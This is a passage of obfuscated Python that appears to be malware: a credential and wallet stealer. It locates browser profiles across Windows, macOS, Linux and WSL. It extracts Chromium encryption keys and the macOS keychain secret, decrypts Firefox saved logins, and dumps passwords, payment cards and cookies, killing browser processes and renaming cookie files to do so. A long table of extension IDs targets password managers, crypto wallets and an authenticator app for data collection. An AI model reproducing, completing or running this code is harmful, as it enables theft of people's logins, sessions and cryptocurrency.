		def __init__(F,login_files=E,cookie_files=E,key_files=E):D='brave';C='-Nightly';B='-Dev';A='-Beta';E={l:U(['~/.config/BraveSoftware/Brave-Browser{channel}/*/Login Data','~/.var/app/com.brave.Browser/config/BraveSoftware/Brave-Browser{channel}/*/Login Data'],channel=[I,A,B,C]),p:N(['BraveSoftware\\Brave-Browser{channel}\\User Data*\\*\\Login Data'],channel=[I,A,B,C]),q:U(['~/Library/Application Support/BraveSoftware/Brave-Browser{channel}/*/Login Data'],channel=[I,A,B,C]),r:U(['~/.config/BraveSoftware/Brave-Browser{channel}/*/Cookies','~/.var/app/com.brave.Browser/config/BraveSoftware/Brave-Browser{channel}/*/Cookies'],channel=[I,A,B,C]),s:N(['BraveSoftware\\Brave-Browser{channel}\\User Data*\\*\\Cookies','BraveSoftware\\Brave-Browser{channel}\\User Data*\\*\\Network\\Cookies'],channel=[I,A,B,C]),u:U(['~/Library/Application Support/BraveSoftware/Brave-Browser{channel}/*/Cookies'],channel=[I,A,B,C]),v:N('BraveSoftware\\Brave-Browser{channel}\\User Data*\\Local State',channel=[I,A,B,C]),w:D,x:'Brave Safe Storage',y:An};super().__init__(browser_name=An,process_name=D,login_files=login_files,cookie_files=cookie_files,key_files=key_files,**E)
	class BL(c):
		'Class for Microsoft Edge'
		def __init__(D,login_files=E,cookie_files=E,key_files=E):B=' Canary';A='-dev';C={l:U(['~/.config/microsoft-edge{channel}/*/Login Data','~/.var/app/com.microsoft.Edge/config/microsoft-edge{channel}/*/Login Data'],channel=[I,AS,A]),p:N(['Microsoft\\Edge{channel}\\User Data*\\*\\Login Data'],channel=[I,Y,b,A7]),q:U(['~/Library/Application Support/Microsoft Edge{channel}/*/Login Data'],channel=[I,Y,b,B]),r:U(['~/.config/microsoft-edge{channel}/*/Cookies','~/.var/app/com.microsoft.Edge/config/microsoft-edge{channel}/*/Cookies'],channel=[I,AS,A]),s:N(['Microsoft\\Edge{channel}\\User Data*\\*\\Cookies','Microsoft\\Edge{channel}\\User Data*\\*\\Network\\Cookies'],channel=[I,Y,b,A7]),u:U(['~/Library/Application Support/Microsoft Edge{channel}/*/Cookies'],channel=[I,Y,b,B]),v:N('Microsoft\\Edge{channel}\\User Data*\\Local State',channel=[I,Y,b,A7]),w:AE,x:'Microsoft Edge Safe Storage',y:B7};super().__init__(browser_name=B8,process_name='msedge',login_files=login_files,cookie_files=cookie_files,key_files=key_files,**C)
	class BM(c):
		def __init__(D,login_files=E,cookie_files=E,key_files=E):B='Arc';A='arc';C={l:[],p:N(['Arc\\User Data*\\*\\Login Data']),q:['~/Library/Application Support/Arc/*/Login Data'],r:[],s:N(['Arc\\User Data*\\*\\Cookies','Arc\\User Data*\\*\\Network\\Cookies']),u:['~/Library/Application Support/Arc/*/Cookies'],v:N('Arc\\User Data*\\Local State'),w:A,x:'Arc Safe Storage',y:B};super().__init__(browser_name=B,process_name=A,login_files=login_files,cookie_files=cookie_files,key_files=key_files,**C)
	class BN(c):
		'Class for Vivaldi Browser'
		def __init__(C,login_files=E,cookie_files=E,key_files=E):A='Vivaldi';B={l:['~/.config/vivaldi/*/Login Data','~/.config/vivaldi-snapshot/*/Login Data','~/.var/app/com.vivaldi.Vivaldi/config/vivaldi/*/Login Data'],p:N(['Vivaldi\\User Data*\\*\\Login Data']),q:['~/Library/Application Support/Vivaldi/*/Login Data'],r:['~/.config/vivaldi/*/Cookies','~/.config/vivaldi-snapshot/*/Cookies','~/.var/app/com.vivaldi.Vivaldi/config/vivaldi/*/Cookies'],s:N(['Vivaldi\\User Data*\\*\\Cookies','Vivaldi\\User Data*\\*\\Network\\Cookies']),u:['~/Library/Application Support/Vivaldi/*/Cookies'],v:N('Vivaldi\\User Data*\\Local State'),w:Ab,x:'Vivaldi Safe Storage',y:A};super().__init__(browser_name=A,process_name='vivaldi',login_files=login_files,cookie_files=cookie_files,key_files=key_files,**B)
	for BO in[BG,BK,BL,BI,BJ,BH,BM,BN]:
		try:
			Q=BO()
			if Q.login_files and Q.cookie_files:
				A5={}
				if AM(Q,B9)and Q.v10_key!=E:A5[B9]=AY.standard_b64encode(Q.v10_key).decode(j)
				if AM(Q,AJ)and Q.v11_key!=E:A5[AJ]=AY.standard_b64encode(Q.v11_key).decode(j)
				if AM(Q,BA)and Q.osx_keychain!=E:A5[BA]=Q.osx_keychain.decode(j)
				if A5:
					A.makedirs(A4,exist_ok=D)
					with R(A.path.join(A4,f"info-{Q.browser_name}.json"),V)as BP:e.dump(A5,BP,indent=4)
				Q.export_passwords_to_file(A4);Q.export_cards_to_file(A4)
				if load_cookies:
					if kill_process:Au(Q.process_name)
					Q.export_cookies_to_file(A4,rename_cookies)
		except G as BQ:C(f"Error: {BQ}");C(W.format_exc(),D)
def Bz(export_path,load_cookies=H,rename_cookies=H,kill_process=H):
	d='error';Q=export_path;import hmac as T
	class b(G):0
	class c:
		MAGIC1=b'\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01';MAGIC2=1,2,840,113549,3,7;MAGIC3=1,2,840,113549,1,12,5,1,3
		def __init__(B,profile_path):B.profile_path=AE(profile_path);C=L(B.profile_path);D=C.split(A.sep);B.process_name=D[-3].lower();E=D[-1].split('.')[0];B.profile_id=f"{B.process_name}-{E}-{h(C)}";B.key4db_file=B.profile_path/'key4.db';B.logins_file=B.profile_path/'logins.json';B.cookies_file=B.profile_path/'cookies.sqlite'
		def askpass(B):
			A=I
			while D:
				try:C=B.getKey(A)
				except b:A=BC('Master Password:')
				else:break
			return C
		def getKey(A,masterPassword=I):
			R='AES';Q='3DES';C=masterPassword
			if not A.key4db_file.exists():raise S(f"key4db not exist: {A.key4db_file}")
			from pyasn1.type.univ import Sequence,OctetString,ObjectIdentifier
			with AF(L(A.key4db_file))as T:
				D=T.cursor();D.execute("\n                    SELECT item1, item2\n                    FROM metadata\n                    WHERE id = 'password';\n                ");H=next(D);E,K=H
				try:F,U=A4(K);A.key4db_enc_method=Q;I=F[0][1][0].asOctets();J=F[1].asOctets();M=A.decrypt3DES(E,C,I,J)
				except BR:A.key4db_enc_method=R;F=A4(K);M=A.decrypt_aes(F,C,E)
				if M!=b'password-check\x02\x02':raise b()
				D.execute('\n                    SELECT a11, a102\n                    FROM nssPrivate\n                    WHERE a102 = ?;\n                ',(A.MAGIC1,))
				try:H=next(D);N,V=H
				except StopIteration:raise G('The Firefox database appears to be broken. Try to add a password to rebuild it.')
			if A.key4db_enc_method==R:B=A4(N);O=A.decrypt_aes(B,C,E)
			elif A.key4db_enc_method==Q:B,U=A4(N);P=B[0][0].asTuple();assert P==A.MAGIC3,f"The key is encoded with an unknown format {P}";I=B[0][1][0].asOctets();J=B[1].asOctets();O=A.decrypt3DES(E,C,I,J)
			return O[:24]
		@A9
		def PKCS7pad(b):A=(-M(b)-1)%8+1;return b+B4([A]*A)
		@A9
		def PKCS7unpad(b):return b[:-b[-1]]
		@A9
		def decrypt_aes(decoded_item,master_password,global_salt):A=decoded_item;C=A[0][0][1][0][1][0].asOctets();D=t(A[0][0][1][0][1][1]);B=t(A[0][0][1][0][1][2]);assert B==32;E=k.sha1(global_salt+master_password.encode(j)).digest();F=k.pbkdf2_hmac('sha256',E,C,D,dklen=B);G=b'\x04\x0e'+A[0][0][1][1][1].asOctets();H=A[0][1].asOctets();I=AES.new(F,AES.MODE_CBC,G);return I.decrypt(H)
		@A9
		def decrypt3DES(globalSalt,masterPassword,entrySalt,encryptedData):A=entrySalt;E=k.sha1(globalSalt+masterPassword.encode()).digest();C=A+b'\x00'*(20-M(A));B=k.sha1(E+A).digest();F=T.new(B,C+A,k.sha1).digest();G=T.new(B,C,k.sha1).digest();H=T.new(B,G+A,k.sha1).digest();D=F+H;I=D[-8:];J=D[:24];return AG.new(J,AG.MODE_CBC,I).decrypt(encryptedData)
		def decodeLoginData(B,key,data):A,F=A4(AY.b64decode(data));assert A[0].asOctets()==B.MAGIC1;assert A[1][0].asTuple()==B.MAGIC2;C=A[1][1].asOctets();D=A[2].asOctets();E=AG.new(key,AG.MODE_CBC,C);return B.PKCS7unpad(E.decrypt(D)).decode()
		def export_passwords(A):
			H='logins'
			if not A.logins_file.exists():raise S(f"logins.json not exist: {A.logins_file}")
			with R(A.logins_file,'r')as J:F=e.load(J)
			if H not in F:raise S(f"logins field not exist: {A.logins_file}")
			G=[];K=A.askpass()
			for L in F[H]:
				B={}
				for(C,D)in L.items():
					if C.startswith('encrypted'):
						if D==E:B[C[9:]]=E
						elif D==I:B[C[9:]]=I
						else:B[C[9:]]=A.decodeLoginData(K,D)
					else:B[C]=D
				G.append(B)
			return G
		def export_passwords_to_file(B,filename):
			A=[]
			try:A=B.export_passwords()
			except G as F:C(W.format_exc(),D);A.append({d:W.format_exc()})
			with R(filename,V)as E:E.write(e.dumps(A,indent=4))
		def export_cookies(B,rename_cookie=H):
			G=[]
			if not B.cookies_file.exists():raise S(f"cookies.sqlite not exist: {B.cookies_file}")
			E=f"{B.cookies_file}~{t(AZ.time())}"
			try:Z(L(B.cookies_file),E)
			except:C(f"failed to create a copied cookie file: {E}",D);E=L(B.cookies_file)
			with AF(E)as K:
				F=K.cursor();F.execute('SELECT * FROM moz_cookies');M=[A[0]for A in F.description]
				for N in F.fetchall():
					I={}
					for(O,P)in Ag(M):I[P]=N[O]
					G.append(I)
			J=H
			if rename_cookie:
				try:B.cookies_file.unlink();C(f"Cookie file renamed to {E}");J=D
				except:C(f"failed to delete original cookie file: {B.cookies_file}")
			elif E!=L(B.cookies_file):
				try:A.remove(E)
				except:C(f"failed to delete copied cookie file: {E}")
			return G,J
		def export_cookies_to_file(P,filename,rename_cookie=H):
			O='isSecure';N='expiry';B=filename;I=[];J=H
			try:
				Q,J=P.export_cookies(rename_cookie)
				for A in Q:
					K=A['host']
					if A[N]==0:L=E
					else:L=A[N]
					S=K[0]!='.';T=A['isHttpOnly']!=0;U=A[AA];X=A[i]
					if A[AR]==1:F='lax'
					elif A[AR]==2:F=BY
					elif A[AR]==-1:F=BZ
					else:F=Ba
					if O in A:M=A[O]!=0
					elif AC in A:M=A[AC]!=0
					Y=A[AQ];I.append({Bb:K,Bc:L,Bd:S,Be:T,AA:U,i:X,AR:F,AC:M,Bf:H,Bg:'0',AQ:Y})
			except G as a:C(W.format_exc(),D);I.append({d:W.format_exc()})
			if J:B=f"{B}-re.json"
			else:B=f"{B}.json"
			with R(B,V)as Z:Z.write(e.dumps(I,indent=4))
	J=[]
	if F.platform==O or F.platform==AS:J+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\Profiles\\*\\logins.json'));J+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\Profiles\\*\\logins.json'));J+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\*\\Profiles\\*\\logins.json'));J+=B.glob(A.path.expandvars('%APPDATA%\\*\\Profiles\\*\\logins.json'));J+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\Profiles\\*\\logins.json'));J+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\*\\Profiles\\*\\logins.json'))
	elif F.platform==m:J+=B.glob(A.path.expanduser('~/Library/Application Support/*/Profiles/*/logins.json'));J+=B.glob(A.path.expanduser('~/Library/Application Support/*/*/Profiles/*/logins.json'));J+=B.glob(A.path.expanduser('~/Library/Application Support/*/*/*/Profiles/*/logins.json'))
	else:J+=B.glob(A.path.expanduser('~/.*/*/Profiles/*/logins.json'));J+=B.glob(A.path.expanduser('~/.config/*/*/Profiles/*/logins.json'));J+=B.glob(A.path.expanduser('~/.config/*/*/*/Profiles/*/logins.json'));J+=B.glob(A.path.expanduser('~/.var/**/Profiles/*/logins.json'));J+=B.glob(A.path.expanduser('~/snap/**/Profiles/*/logins.json'))
	if M(J)>0:
		if f==H or Ah in K:a('pyasn1');a('pycryptodome')
		global A4;global AES,AG;from pyasn1.codec.der.decoder import decode as A4;from Crypto.Cipher import AES,DES3 as AG;A.makedirs(Q,exist_ok=D)
		for U in J:
			if AT in U or AU in U:continue
			X=AE(U).parent;P=c(X);P.export_passwords_to_file(A.path.join(Q,f"login-{P.profile_id}.json"))
	if load_cookies:
		N=[]
		if F.platform==O or F.platform==AS:N+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\Profiles\\*\\cookies.sqlite'));N+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\Profiles\\*\\cookies.sqlite'));N+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\*\\Profiles\\*\\cookies.sqlite'));N+=B.glob(A.path.expandvars('%APPDATA%\\*\\Profiles\\*\\cookies.sqlite'));N+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\Profiles\\*\\cookies.sqlite'));N+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\*\\Profiles\\*\\cookies.sqlite'))
		elif F.platform==m:N+=B.glob(A.path.expanduser('~/Library/Application Support/*/Profiles/*/cookies.sqlite'));N+=B.glob(A.path.expanduser('~/Library/Application Support/*/*/Profiles/*/cookies.sqlite'));N+=B.glob(A.path.expanduser('~/Library/Application Support/*/*/*/Profiles/*/cookies.sqlite'))
		else:N+=B.glob(A.path.expanduser('~/.*/*/Profiles/*/cookies.sqlite'));N+=B.glob(A.path.expanduser('~/.config/*/*/Profiles/*/cookies.sqlite'));N+=B.glob(A.path.expanduser('~/.config/*/*/*/Profiles/*/cookies.sqlite'));N+=B.glob(A.path.expanduser('~/.var/**/Profiles/*/cookies.sqlite'));N+=B.glob(A.path.expanduser('~/snap/**/Profiles/*/cookies.sqlite'))
		if M(N)>0:
			A.makedirs(Q,exist_ok=D)
			for Y in N:
				if AT in Y or AU in Y:continue
				X=AE(Y).parent;P=c(X);Z(P.cookies_file,A.path.join(Q,f"cookie-{P.profile_id}.sqlite"))
				if kill_process:Au(P.process_name)
				P.export_cookies_to_file(A.path.join(Q,f"cookie-{P.profile_id}"),rename_cookies)
def Aw(target_path,spf_export_path,load_cookies=H,rename_cookies=H,kill_process=H):
	i='Cookies';U=spf_export_path;S=target_path;I=[]
	if F.platform==O or F.platform==AS:I+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\Login Data'));I+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\*\\Login Data'));I+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\*\\*\\Login Data'));I+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\*\\User Data*\\*\\Login Data'));I+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\Login Data'));I+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\*\\Login Data'));I+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\*\\*\\Login Data'));I+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\*\\User Data*\\*\\Login Data'))
	elif F.platform==m:I+=B.glob(A.path.expanduser('~/Library/Application Support/*/*/Login Data'));I+=B.glob(A.path.expanduser('~/Library/Application Support/*/*/*/Login Data'));I+=B.glob(A.path.expanduser('~/Library/Application Support/*/*/*/*/Login Data'))
	else:I+=B.glob(A.path.expanduser('~/.*/*/Login Data'));I+=B.glob(A.path.expanduser('~/.config/*/*/Login Data'));I+=B.glob(A.path.expanduser('~/.config/*/*/*/Login Data'));I+=B.glob(A.path.expanduser('~/.var/**/Login Data'));I+=B.glob(A.path.expanduser('~/snap/**/Login Data'));I+=B.glob('/mnt/*/Users/*/AppData/*/*/*/Login Data');I+=B.glob('/mnt/*/Users/*/AppData/*/*/*/*/Login Data');I+=B.glob('/mnt/*/Users/*/AppData/*/*/*/*/*/Login Data');I+=B.glob('/mnt/*/Users/*/AppData/*/*/*/*/User Data*/*/Login Data')
	if M(I)==0:return
	A.makedirs(S,exist_ok=D);A.makedirs(U,exist_ok=D);W=[]
	for T in I:
		if AT in T or AU in T:continue
		J=A.path.dirname(T)
		try:
			Y=h(J);W.append(f"{J} #{Y}");a=T.split(A.sep);K=a[-4]if Bj in J else a[-3]
			if K==Bk:K=An
			elif K==Bl:K=Am
			elif K==B7 or K==Bm:K=B8
			N=A.path.basename(J)
			if N==AN:N=0
			elif N.startswith(AO):N=N[8:]
			elif N.endswith(AP):N=N[:-8]
			P=f"{K}-{N}-{Y}"
			if T.startswith('/mnt/'):P='mnt$'+P
			if A.path.isfile(T):Z(T,A.path.join(S,f"login-{P}.db"))
			b=A.path.join(J,Bi)
			if A.path.isfile(b):Z(b,A.path.join(S,f"webdata-{P}.db"))
			c=A.path.join(J,'Preferences');d=A.path.join(J,'Secure Preferences')
			if A.path.isfile(c):Z(c,A.path.join(U,f"{P}-p.json"))
			if A.path.isfile(d):Z(d,A.path.join(U,f"{P}-s.json"))
			if load_cookies:
				Q=A.path.join(J,i)
				if not A.path.isfile(Q):e=B.glob(A.path.join(J,Bh,i));Q=e[0]if M(e)>0 else E
				if Q!=E and A.path.isfile(Q):
					if kill_process:Au(K.lower())
					X=f"{Q}~{t(AZ.time())}";f=H
					if rename_cookies:
						try:A.rename(Q,X);C(f"Cookie file renamed to {X}");f=D
						except G as j:C(f"Failed to rename: {Q}: {j}")
					if f:Z(X,A.path.join(S,f"cookie-{P}-re.db"))
					else:Z(Q,A.path.join(S,f"cookie-{P}.db"))
		except G as g:W.append(f"{J}: {g}");C(f"Error {J}: "+L(g))
	if A.path.isdir(S):
		with R(A.path.join(S,'_chromium_profiles.txt'),V)as k:k.write(u.join(W))
def B_(target_path,local_storage_export_path):
	k='Sync Extension Settings';j='Local Extension Settings';i='LastPass';g='hnfanknocfeofbddgcijnmhnfnkdnaad';f='hdokiejnpimakedhajhdlcegeplioahd';Z=local_storage_export_path;Y='IndexedDB';T=target_path;a={'aeblfdkhhhdcdjpifhhbdiojplfjncoa':B9,'gejiddohjgogedgjnonbofjigllpkmbf':'1PasswordNightly','khgocmkkpikpnmmkgmdnfckapcdkgfaf':'1PasswordBeta','dppgmdbiimibapkepcbdbmkaabgiofem':'1PasswordEdge',f:i,'fdjamakpfbbddfjaooikfcpapjohcfmg':AV,'eiaeiblijfjekdanodkjadfinkhbfgcd':AW,'fooolghllnmhmmndgjiamiiodkpenpbb':'NordPassLegacy','pnlccmojcmeohlpggmfnbbiapkmbliob':'RoboForm','bfogiafebfohielmmehodmfbbebbbpei':'Keeper','nngceckbapebfimnlniiiahkandclblb':AX,'ghmbeldphafepmbegfdlkpapadhbakde':'ProtonPass','hlcjpjebakkiaolkpceofenleehjgeca':'Passwarden','hihnblnamcfdfdjamdhhcgnpmkhmecjm':'mSecure','folnjigffmbjmcjgmbbfcpleeddaedal':'LogMeOnce','njimencmbpfibibelblbbabiffimoajp':'TotalPassword','deelhmmhejpicaaelihagchjjafjapjc':'MEGAPass','fjbgpaheigpmkbdkdfghmkbnkpeofmhh':'Aura','lgbjhdkjmpgjgcbcdlhkokkckpjmedgc':'DualSafe','mmhlniccooihdimnnjhamobppdhaolme':'Kee','cnlhokffphohmfcddnibpohmkdfafdli':'MultiPassword','kmcfomidfpdkfieipokbalgegidffkal':'Enpass','nhhldecdfagpbfggphklkaeiocfnaafm':'FreePasswordManager','khhapgacijodhjokkcjmleaempmchlem':'ESET','didegimhafipceonhjepacocaffmoppf':'Passbolt','jgnfghanfbjmimbdmnjfofnbcgpkbegj':'KeePassHelper','blgcbajigpdfohpgcmbbfnphcgifjopc':'ExpressVPNKeys','hldllnfgjbablcfcdcjldbbfopmohnda':'pCloudPass','bmhejbnmpamgfnomlahkonpanlkcfabg':'DropboxPasswords','pejdijmoenmkgeppbflobdenhhabjlaj':'iCloudPasswords','igkpcodhieompeloncfnbekccinhapdb':'ZohoVault','dphoaaiomekdhacmfoblfblmncpnbahm':'ChromeKeePass','oboonakemofpalcgghocfoadofidjkkk':'KeePassXC','aeachknmefphepccionboohckonoeemg':'Coin98','aholpfdialjgjfhomihkjbmgjidlcdno':'Exodus','bfnaelmomeimhlpmgjnjophhpkkoljpa':'Phantom','ejbalbakoplchlghecdalmeeeajnimhm':'MetaMask-Edge','ejjladinnckdgjemekebdpeokbikhfci':'PetraAptos','egjidjbpglichdcondbcbdnbeeppgdph':'Trust','fhbohimaelbohpjbbldcngcnapndodjp':'Binance','gjdfdfnbillbflbkmldbclkihgajchbg':'Termux','hifafgmccdpekplomjjkcfgodnhcellj':'Crypto.com',g:'CoinBase','ibnejdfjmmkpcnlpebklmnkoeoihofec':'TronLink','lgmpcpglpngdoalbgeoldeajfclnhafa':'Safepal','mcohilncbfahbmgdjkbpemcciiolgcge':'OKX','nkbihfbeogaeaoehlefnkodbefgpgknn':'MetaMask','ljfoeinjpaedjfecbmggjgodbgkmjkjk':'MetaMask-Flask','nphplpgoakhhjchkkhmiggakijnkhfnd':'Ton','pdliaogehgdbhbnmkklieghmmjkpigpa':'ByBit','phkbamefinggmakgklpkljjmgibohnba':'Pontem','kkpllkodjeloidieedojogacfhpaihoh':'Enkrypt','agoakfejjabomempkjlepdflaleeobhb':'Core-Crypto','jiidiaalihmmhddjgbnbgdfflelocpak':'Bitget','kgdijkcfiglijhaglibaidbipiejjfdp':'Cirus','kkpehldckknjffeakihjajcjccmcjflh':'HBAR','idnnbdplmphpflfnlkomgpfbpcgelopg':'Xverse','fccgmnglbhajioalokbcidhcaikhlcpm':'Zapit','fijngjgcjhjmmpcmkeiomlglpeiijkld':'Talisman','enabgbdfcbaehmbigakijjabdpdnimlg':'Manta','onhogfjeacnfoofkfgppdlbmlmnplgbn':'Sub-Polkadot','amkmjjmmflddogmhpjloimipbofnfjih':'Wombat','glmhbknppefdmpemdmjnjlinpbclokhn':'Orange','hmeobnfnfcmdkdcmlblgagmfpfboieaf':'XDEFI','acmacodkjbdgmoleebolmdjonilkdbch':'Rabby','fcfcfllfndlomdhbehjjcoimbgofdncg':'LeapCosmos','anokgmphncpekkhclmingpimjmcooifb':'Compass-Sei','epapihdplajcdnnkdeiahlgigofloibg':'Sender','efbglgofoippbgcjepnhiblaibcnclgk':'Martian','ldinpeekobnhjjdofggfgjlcehhmanlj':'Leather','lccbohhgfkdikahanoclbdmaolidjdfl':'Wigwam','abkahkcbhngaebpcgfmhkoioedceoigp':'Casper','bhhhlbepdkbapadjdnnojkbgioiodbic':'Solflare','klghhnkeealcohjjanjjdaeeggmfmlpl':'Zerion','lnnnmfcpbkafcpgdilckhmhbkkbpkmid':'Koala','ibljocddagjghmlpgihahamcghfggcjc':'Virgo','ppbibelpcjmhbdihakflkdcoccbgbkpo':'UniSat','afbcbjpbpfadlkmhmclhkeeodmamcflc':'Math','ebfidpplhabeedpnhjnobghokpiioolj':'Fewcha-Move','fopmedgnkfpebgllppeddmmochcookhc':'Suku','gjagmgiddbbciopjhllkdnddhcglnemk':'Hashpack','jnlgamecbpmbajjfhmmmlhejkemejdma':'Braavos','pgiaagfkgcbnmiiolekcfmljdagdhlcm':'Stargazer','khpkpbbcccdmmclmpigdgddabeilkdpd':'Suiet','kilnpioakcdndlodeeceffgjdpojajlo':'Aurox','bopcbmipnjdcdfflfgjdgdjejmgpoaab':'Block','kmhcihpebfmpgmihbkipmjlmmioameka':'Eternl','aflkmfhebedbjioipglgcbcmnbpgliof':'Backpack','ajkifnllfhikkjbjopkhmjoieikeihjb':'Moso','pfccjkejcgoppjnllalolplgogenfojk':'Tomo','jaooiolkmfcmloonphpiiogkfckgciom':'Twetch','kmphdnilpmdejikjdnlbcnmnabepfgkh':'OsmWallet','hbbgbephgojikajhfbomhlmmollphcad':'Rise','nbdhibgjnjpnkajaghbffjbkcgljfgdi':'Ramper','fldfpgipfncgndfolcbkdeeknbbbnhcc':'MyTon','jnmbobjmhlngoefaiojfljckilhhlhcj':'OneKey','fcckkdbjnoikooededlapcalpionmalo':'MOBOX','gadbifgblmedliakbceidegloehmffic':'Paragon','ebaeifdbcjklcmoigppnpkcghndhpbbm':'SenSui','opfgelmcmbiajamepnmloijbpoleiama':'Rainbow','jfflgdhkeohhkelibbefdcgjijppkdeb':'OrdPay','kfecffoibanimcnjeajlcnbablfeafho':'Libonomy','opcgpfmipidbgpenhmajoajpbobppdil':'Slush','penjlddjkjgpnkllboccdgccekpkcbin':'OpenMask','kbdcddcmgoplfockflacnnefaehaiocb':'Shell','abogmiocnneedmmepnohnhlijcjpcifd':'Blade','omaabbefbmiijedngplfjmnooppbclkk':'Tonkeeper','cnncmdhjacpkmjmkcafchppbnpnhdmon':'HAVAH','eokbbaidfgdndnljmffldfgjklpjkdoi':'Fluent','fnjhmkhhmkbjkkabndcnnogagogbneec':'Ronin','dmkamcknogkgcdfhhbddcghachkejeap':'Keplr','dlcobpjiigpikoobohmabehhmhfoodbb':'ArgentX','aiifbnbfobpmeekipheeijimdpnlpgpp':'Station','eajafomhmkipbjmfmhebemolkcicgfmd':'Taho','mkpegjkblkkefacfnmkajcjmabijhclg':'MagicEden','ffbceckpkpbcmgiaehlloocglmijnpmp':'Initia','lpfcbjknijpeeillifnkikgncikgfhdo':'Nami','fpkhgmpbidmiogeglndfbkegfdlnajnf':'Cosmostation','kppfdiipphfccemcignhifpjkapfbihd':'Frontier','cfbfdhimifdmdehjmkdobpcjfefblkjm':'Plug','ookjlbkiijinhpmnjffcofjonbfbgaoc':'Tezos','iokeahhehimjnekafflcihljlcjccdbe':'Alby','mcbigmjiafegjnnogedioegffbooigli':'EthosSui','mfgccjchihfkkindfppnaooecgfneiii':'TokenPocket','gafhhkghbfjjkeiendhlofajokpaflmk':'Lace','aheklkkgnmlknpgogcnhkbenfllfcfjb':'Tronlink-Edge','pbpjkcldjiffchgbbndmhojiacbgflha':'OKX-Edge','dfeccadlilpndjjohbjdblepmjeahlmm':'Math-Edge','kcgelamicebnalepkbppmoeiaaaljcee':'EthosSui-Edge','apenkfbbpmhihehmihndmmcdanacolnh':'SafePal-Edge','pgpdomeflfhcmgdbfdlociknopahmbej':'MyTon-Edge','ajkhoeiiokighlmdnlakpjfoobnjinie':'Station-Edge','bcpcfajkbagnicoppbogbgemdodphjne':'TorchWallet','faobkiaokccpmnhhefnobkbhnfjmbemh':'ZetrixWallet','hcgejekffjilpgbommjoklpneekbkajb':'Kibisis','nebnhfamliijlghikdgcigoebonmoibm':'LeoWallet','einnioafmpimabjcddiinlhmijaionap':'Wander','cnmamaachppnkjgnildpdmkaakejnhae':'AuroWallet','dngmlblcodfobpdpecaadgfbcggfjfnm':'MultiversX','klnaejjgbibmhlephnhpmaofohgkpgkd':'ZilPay','ppdadbejkmjnefldpcdjhnkpbjkikoip':'Rose','nhnkbkgjikgcigadomkphalanndcapjk':'CLV','pdadjkfkgcafgbceimcpbkalnfnepbnk':'KardiaChain','andhndehpcjpmneneealacgnmealilal':'HaHa','cnoepnljjcacmnjnopbhjelpmfokpijm':'Kabila','dldjpboieedgcmpkchcjcbijingjcgok':'Fuel','ellkdbaphhldpeajbepobaecooaoafpg':'ASIAlliance','nhccebmfjcbhghphpclcfdkkekheegop':'Pelagus','lpilbniiabackdjcionkobglmddfbcjo':'KeeperWallet'};b={'bhghoamapcdpbohphigoooaddinpkbai':'GoogleAuth'};c={f:i};E=[]
	if F.platform==O or F.platform==AS:E+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\* Extension Settings\\*'));E+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\*\\* Extension Settings\\*'));E+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\*\\*\\* Extension Settings\\*'));E+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\*\\User Data*\\*\\* Extension Settings\\*'));E+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\* Extension Settings\\*'));E+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\*\\* Extension Settings\\*'));E+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\*\\*\\* Extension Settings\\*'));E+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\*\\User Data*\\*\\* Extension Settings\\*'));E+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\IndexedDB\\chrome-extension_*'));E+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\*\\IndexedDB\\chrome-extension_*'));E+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\*\\*\\IndexedDB\\chrome-extension_*'));E+=B.glob(A.path.expandvars('%LOCALAPPDATA%\\*\\*\\*\\User Data*\\*\\IndexedDB\\chrome-extension_*'));E+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\IndexedDB\\chrome-extension_*'));E+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\*\\IndexedDB\\chrome-extension_*'));E+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\*\\*\\IndexedDB\\chrome-extension_*'));E+=B.glob(A.path.expandvars('%APPDATA%\\*\\*\\*\\User Data*\\*\\IndexedDB\\chrome-extension_*'))
	elif F.platform==m:E+=B.glob(A.path.expanduser('~/Library/Application Support/*/*/* Extension Settings/*'));E+=B.glob(A.path.expanduser('~/Library/Application Support/*/*/*/* Extension Settings/*'));E+=B.glob(A.path.expanduser('~/Library/Application Support/*/*/*/*/* Extension Settings/*'));E+=B.glob(A.path.expanduser('~/Library/Application Support/*/*/IndexedDB/chrome-extension_*'));E+=B.glob(A.path.expanduser('~/Library/Application Support/*/*/*/IndexedDB/chrome-extension_'));E+=B.glob(A.path.expanduser('~/Library/Application Support/*/*/*/*/IndexedDB/chrome-extension_'))
